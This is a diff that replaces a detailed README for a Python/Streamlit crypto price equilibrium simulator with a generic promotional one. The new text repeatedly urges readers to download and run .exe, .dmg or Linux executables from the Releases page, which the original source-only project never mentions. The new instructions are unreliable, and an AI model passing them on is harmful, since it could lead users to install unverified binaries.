@@ -1,450 +1,90 @@
-# **Crypto Price Equilibrium Simulator**
+# 📈 Crypto-Price-Equilibrium-Simulator - Analyze Crypto Prices with Confidence
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Project-Crypto%20Equilibrium%20Simulator-blueviolet?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/Category-Market%20Modeling-4CAF50?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/Theory-Equilibrium%20Forces-orange?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/Python-3.10+-blue?style=for-the-badge&logo=python" />
-  <img src="https://img.shields.io/badge/Framework-Streamlit-red?style=for-the-badge&logo=streamlit" />
-  <img src="https://img.shields.io/badge/Engine-Force%20Decomposition-9C27B0?style=for-the-badge" />
+## 🚀 Getting Started
 
-</p>
+Welcome to the Crypto-Price-Equilibrium-Simulator! This application helps you understand cryptocurrency prices by examining how market forces interact. With our simulator, you can explore demand, supply, volatility, and more.
 
----
+## 🡲 Download Now
 
-# **Overview**
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/khalidSolangi/Crypto-Price-Equilibrium-Simulator/releases)
 
-**Crypto markets are not predictable, but they are explainable.**
-Instead of treating price as something to forecast, this project treats price as something to **interpret** through equilibrium theory.
+## 🥇 Overview
 
-The **Crypto Price Equilibrium Simulator** models cryptocurrencies as systems governed by **forces**:
+The Crypto-Price-Equilibrium-Simulator is designed for users who want to dive deep into crypto analytics without needing a technical background. This user-friendly tool:
 
-* **Demand** (inflow, momentum)
-* **Supply** (scarcity, dilution)
-* **Volatility** (risk, instability)
-* **Liquidity** (depth, participation)
-* **Speculation** (hype, short-term behavioral pressure)
+- Computes force decompositions to analyze price movements.
+- Identifies equilibrium bands that help track price levels.
+- Provides tension scores to understand market pressure.
+- Engages in scenario-based simulations to showcase different market conditions.
 
-These forces interact continuously, pushing prices upward or downward.
-Instead of estimating a single target price, the model produces:
+This application empowers users with clear insights into the complexities of cryptocurrency pricing.
 
-* **Equilibrium Center**, where the market *wants* the price to stabilize
-* **Equilibrium Band**, acceptable price volatility range
-* **Equilibrium Shift (%)**, deviation between market and equilibrium
-* **Tension Score**, instability of the market environment
-* **Force Decomposition**, transparent breakdown of upward/downward pressures
+## 📥 Download & Install
 
-The goal is **interpretability**, giving traders, analysts, and researchers a way to *see* how crypto markets negotiate price.
+To get started, visit the Releases page. Here you will find the latest version of the software. Click the link below to access the page and download the application.
 
-This project includes:
+[Download Latest Release](https://github.com/khalidSolangi/Crypto-Price-Equilibrium-Simulator/releases)
 
-* A **full modeling engine**
-* A **CLI for data preparation & force inspection**
-* A **Streamlit dashboard** with interactive simulation tools
-* A complete **market equilibrium map** of 1000+ cryptocurrencies
+### Steps to Download:
 
----
+1. Click on the link above to open the Releases page.
+2. Look for the latest version, which will be labeled clearly.
+3. Find the file suited for your system (Windows, macOS, or Linux).
+4. Click on the file to start the download.
 
-# **Dataset**
+### System Requirements
 
-This project uses the **Top 1000 Cryptocurrencies Real-Time Data (2025)** dataset
-by **Mihika Ajay Jadhav** on Kaggle:
+- **Operating System:** Windows 10 or later, macOS Catalina or later, or any Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** A minimum of 100 MB of free space for installation.
+- **Internet Connection:** Required for initial setup and updates.
 
-[https://www.kaggle.com/datasets/mihikaajayjadhav/top-1000-cryptocurrencies-real-time-data-2025](https://www.kaggle.com/datasets/mihikaajayjadhav/top-1000-cryptocurrencies-real-time-data-2025)
+## 🔧 How to Run the Application
 
-It includes:
+After downloading, follow these steps to run the application:
 
-* Prices, volumes, and market caps
-* 1h / 24h / 7d / 30d / 1y price % changes
-* Circulating, total, and max supply
-* ATH / ATL metrics
-* Rank, symbol, and name
+1. Locate the downloaded file in your Downloads folder.
+2. For Windows, double-click the `.exe` file. For macOS, open the `.dmg` file and drag the application to your Applications folder. On Linux, extract the files and run the executable in the terminal.
+3. Follow any on-screen prompts to complete the installation.
 
-This information is rich enough to build a **force-based equilibrium model** without requiring historic price series.
+Once installed, run the application to start analyzing cryptocurrency prices.
 
----
+## 🎛️ Features
 
-# **Theoretical Foundation**
+The Crypto-Price-Equilibrium-Simulator includes several features designed to enhance your understanding of crypto market dynamics:
 
-## Why Prediction Fails in Crypto
+- **Force Decomposition:** Break down complex price movements into understandable segments.
+- **Equilibrium Bands:** Analyze the price ranges where supply and demand meet.
+- **Tension Scores:** Evaluate which factors are exerting pressure on the market.
+- **Scenario Modelling:** Perform "what-if" analyses by simulating different market conditions.
 
-Crypto markets are:
+These features utilize advanced modeling techniques without requiring any coding skills.
 
-* Extremely volatile
-* Highly speculative
-* Behaviorally driven
-* Influenced by liquidity shocks and circulation dynamics
-* Not governed by stable fundamentals
+## 📊 Use Cases
 
-Predicting exact prices is nearly impossible.
+Whether you are a casual investor or a more serious trader, this simulator can help you make informed decisions. Here are some scenarios in which the simulator can be beneficial:
 
-But **understanding forces** is feasible.
+- **Assessing Short-Term Trades:** Quickly analyze how market forces may impact price in the near term.
+- **Long-Term Investment Strategies:** Understand underlying trends to support longer investment horizons.
+- **Risk Management:** Evaluate potential risks in various market conditions.
 
----
+## 💬 Community Support
 
-## Price as a Negotiated Outcome
+Join our community to learn more and get support:
 
-We treat price as:
+- **Discord Server:** Connect with fellow users to share insights and ask questions.
+- **GitHub Issues:** Report any problems or suggest features to improve the application.
+- **Documentation:** Access our comprehensive guide for more in-depth usage instructions.
 
-> **a temporary agreement between opposing forces.**
+## 🔍 Conclusion
 
-Just like particles in physics, assets in markets sit at the intersection of:
+The Crypto-Price-Equilibrium-Simulator makes it easier for anyone to analyze cryptocurrency prices. With clear features and an intuitive approach, you can gain insights into market dynamics without needing extensive technical knowledge.
 
-* upward pressure
-* downward pressure
-* internal instability
+We encourage you to download the application and start exploring the world of cryptocurrency today!
 
-When forces balance, the asset is in **equilibrium**.
-When forces diverge, the asset exhibits **tension**.
+## 🔗 Additional Resources
 
----
+- [Documentation](https://github.com/khalidSolangi/Crypto-Price-Equilibrium-Simulator/docs) - Detailed instructions on how to use each feature.
+- [GitHub Repository](https://github.com/khalidSolangi/Crypto-Price-Equilibrium-Simulator) - Access the source code and contribute to the project.
 
-## Force-Based Modeling
-
-Each crypto asset is transformed into a 5-dimensional force vector:
-
-| Force           | Meaning                  | Interpretation                    |                     |
-| --------------- | ------------------------ | --------------------------------- | ------------------- |
-| **Demand**      | Market appetite          | High interest → upward pull       |                     |
-| **Supply**      | Scarcity / cap structure | Scarce → upward                   | Diluting → downward |
-| **Volatility**  | Risk environment         | High → downward pressure          |                     |
-| **Liquidity**   | Stability of trading     | High → stabilizes equilibrium     |                     |
-| **Speculation** | Short-term hype          | Can strongly push up or pull down |                     |
-
-These forces are normalized to a standard scale **[-1, 1]** to expose their relative strength.
-
----
-
-## Equilibrium Shift
-
-The model computes:
-
-```
-raw_shift =
-    0.35 * demand
-  + 0.20 * supply
-  - 0.20 * volatility
-  + 0.15 * liquidity
-  + 0.30 * speculation
-```
-
-Then scales it:
-
-```
-equilibrium_shift = 0.15 * raw_shift
-```
-
-Meaning:
-
-* Positive shift → equilibrium is higher than current price
-* Negative shift → price may be stretched above equilibrium
-
----
-
-## Equilibrium Band
-
-The band widens when:
-
-* volatility is high
-* speculation is high
-* liquidity is low
-
-Because instability expands the uncertainty region.
-
----
-
-## Tension Score
-
-Tension measures:
-
-* how strongly forces disagree
-* how volatile the environment is
-* how fragile price becomes
-
-High tension assets are “fragile equilibria.”
-
----
-
-# Project Structure
-
-```
-Crypto-Price-Equilibrium-Simulator/
-│
-├── src/
-│   ├── config.py
-│   ├── data_prep.py
-│   ├── equilibrium.py
-│   └── cli.py
-│
-├── app/
-│   └── app.py
-│
-├── data/
-│   ├── raw/
-│   └── processed/
-│
-├── reports/
-│   └── metrics/
-│
-└── README.md
-```
-
----
-
-# **Streamlit Application**
-
-The UI has three main panels.
-
----
-
-# **1. Single Coin Equilibrium View**
-
-<img width="1274" height="600" alt="Screenshot 2025-12-11 at 17-45-50 Crypto Price Equilibrium Simulator" src="https://github.com/user-attachments/assets/e3b3d98e-7561-4d4e-b7ce-664c50e7adaf" />
-
-This view focuses on one asset at a time, breaking down:
-
-* Current price
-* Market forces
-* Equilibrium center
-* Equilibrium shift
-* Lower/upper bands
-* Tension score
-
-### Equilibrium Center
-
-Represents the modeled “fair price” given the interacting forces:
-
-* If demand + speculation dominate → equilibrium above current price
-* If volatility + supply dominate → equilibrium below current price
-
-### Equilibrium Shift (%)
-
-A concise summary of price misalignment:
-
-* **Positive** → market forces push the asset higher
-* **Negative** → market forces push it lower
-* **Near zero** → asset is price-aligned with equilibrium
-
-### Equilibrium Band
-
-Represents the realistic price range considering instability.
-A wide band = chaotic environment.
-A narrow band = stable market conditions.
-
-### Tension Score
-
-High tension means:
-
-* forces are in conflict
-* volatility is elevated
-* equilibrium is unstable
-
-This score is extremely valuable for risk assessment.
-
-### Force Decomposition
-
-This is the heart of interpretability.
-
-**Demand** up?
-→ buyers dominate.
-
-**Supply** down?
-→ supply oversaturation.
-
-**Speculation** up?
-→ hype or fear dominating fundamentals.
-
-**Liquidity** weak?
-→ market depth insufficient.
-
-**Volatility** strong negative?
-→ environment too unstable for price convergence.
-
-This visualization explains **why** the equilibrium shifted.
-
----
-
-# **2. Scenario Simulator (What-If Analysis)**
-
-<img width="1302" height="646" alt="Screenshot 2025-12-11 at 18-04-19 Crypto Price Equilibrium Simulator" src="https://github.com/user-attachments/assets/e50a8f36-710c-4af4-b8c5-4c253c187236" />
-
-This section lets you simulate **hypothetical market conditions**.
-
-It is essentially a **market physics sandbox**, allowing analysts to ask:
-
-* What if volatility doubled?
-* What if liquidity surged?
-* What if supply shocks occurred?
-* What if market demand collapsed?
-
-### Sliders:
-
-**Volume multiplier**
-Simulates inflow/outflow shocks.
-
-**Volatility multiplier**
-Simulates stress events, flash crashes, or stabilization.
-
-**Supply utilization shift**
-Simulates scarcity changes (burns, unlocks, halvings).
-
----
-
-### Scenario Output Explanation
-
-The screenshot demonstrates:
-
-* Equilibrium center rising from **3114 → 3291**
-* Equilibrium shift **+5.68%**
-* Band width reflects a mix of volatility (widening) and liquidity (tightening)
-* Tension score **1.023** suggesting instability
-
----
-
-### Scenario Force Decomposition
-
-This chart answers the question:
-
-> “How did the forces change under my hypothetical environment?”
-
-* **Demand force** increases dramatically if volume increases
-* **Supply force** changes with utilization shifts
-* **Volatility force** becomes more negative when volatility spikes
-* **Speculation force** grows when volatility × liquidity intensifies
-
-This section transforms the app into a **decision-support platform** for analysts.
-
----
-
-# **3. Market Equilibrium Map**
-
-<img width="1244" height="617" alt="Screenshot 2025-12-11 at 18-04-52 Crypto Price Equilibrium Simulator" src="https://github.com/user-attachments/assets/811ffaad-6a87-45f2-a724-a5292dd4e8a3" />
-
-This map visualizes every cryptocurrency as a point in a **force-driven equilibrium space**.
-
-### X-Axis: Equilibrium Shift
-
-Shows whether an asset is:
-
-* pulled upward (right side)
-* pulled downward (left side)
-* or stable (center)
-
-### Y-Axis: Tension Score
-
-Shows how violently the market forces interact:
-
-* low tension → stable equilibrium
-* high tension → fragile equilibrium
-
----
-
-### How to Interpret the Screenshot
-
-The screenshot shows:
-
-* A rising curve: higher equilibrium shift often correlates with higher tension
-* Clusters of assets: groups behaving similarly under market stress
-* Outliers: assets with extreme disequilibrium, often highly speculative
-* Calm zone around (0, 0.3–0.6): assets near equilibrium and low risk
-* Unstable zone in upper-right corner: high shift + high tension → speculative bubbles
-
-This map becomes a **market-wide diagnostic tool**.
-
----
-
-# CLI Usage
-
-All commands should be run from the project root directory.
-
-### Prepare processed data
-
-```bash
-python -m src.cli prepare-data
-```
-
-This will:
-
-* read `data/raw/crypto_top1000_dataset.csv`
-* clean and engineer features
-* compute forces & equilibrium values
-* cache the result in `data/processed/crypto_equilibrium.parquet`
-
----
-
-### Inspect equilibrium for a single asset
-
-You can select an asset by **index** (row number in the processed dataset):
-
-```bash
-python -m src.cli show-equilibrium --index 0
-```
-
-Or by **symbol**:
-
-```bash
-python -m src.cli show-equilibrium --symbol ETH
-```
-
-The CLI prints:
-
-* basic asset metadata (symbol, name, rank)
-* current price, market cap, and volume
-* all five forces (demand, supply, volatility, liquidity, speculation)
-* equilibrium shift, center, band, and tension score
-
----
-
-### Export a full equilibrium snapshot
-
-```bash
-python -m src.cli export-equilibrium --out equilibrium_snapshot.csv
-```
-
-Output is saved under:
-
-```text
-reports/metrics/equilibrium_snapshot.csv
-```
-
-You can open this in a notebook, Excel, or any BI tool to do more custom analysis.
-
----
-
-## Streamlit Dashboard
-
-Run the dashboard with:
-
-```bash
-streamlit run app/app.py
-```
-
-The UI has three tabs:
-
-1. **Single Coin**
-2. **Scenario Simulator**
-3. **Market Map**
-
----
-
-# Limitations
-
-This model is **interpretative**, not predictive.
-
-* Uses snapshot data
-* Does not incorporate order book depth
-* No historical volatility estimation
-* No causal modeling
-* Scenario results are directional, not exact
-
-Still, it reveals deep market structure invisible in raw prices.
-
----
-
-# Future Improvements
-
-* Time-series equilibrium drift
-* Order-book-informed demand pressure
-* Automated equilibrium regime detection
-* ML-generated force weights
-* Narrative-driven scenario templates
+[Download Latest Release](https://github.com/khalidSolangi/Crypto-Price-Equilibrium-Simulator/releases)
